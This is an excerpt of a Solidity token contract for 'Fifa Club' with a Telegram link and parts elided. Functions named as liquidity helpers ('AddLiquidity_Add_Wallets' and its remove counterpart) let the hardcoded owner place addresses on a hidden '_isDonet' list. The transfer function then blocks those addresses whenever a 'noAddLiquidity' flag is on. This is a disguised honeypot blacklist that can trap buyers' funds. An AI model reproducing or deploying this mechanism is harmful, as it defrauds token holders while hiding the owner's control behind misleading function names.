...
//Telegram : https://t.me/FifaClubGo
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x0d6aC8a7F068921220a06fd8283eeD7270A5cad9;
...
contract FifaClub is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) public _isDonet;

 
    bool public noAddLiquidity;
   
    


    address payable private Wallet_Dev = payable(0x0d6aC8a7F068921220a06fd8283eeD7270A5cad9);
    ...
    string private _name = "Fifa Club"; 
    ...
    function AddLiquidity_Add_Wallets(address[] calldata addresses) external onlyOwner {
    ...
    for (uint256 i; i < addresses.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(!_isDonet[addresses[i]]){
        _isDonet[addresses[i]] = true;}
    ...
    function AddLiquidity_Remove_Wallets(address[] calldata addresses) external onlyOwner {
    ...
    function _transfer(
        ...
        if (noAddLiquidity){
        require(!_isDonet[from] && !_isDonet[to], "This address is Donet. Transaction reverted.");}
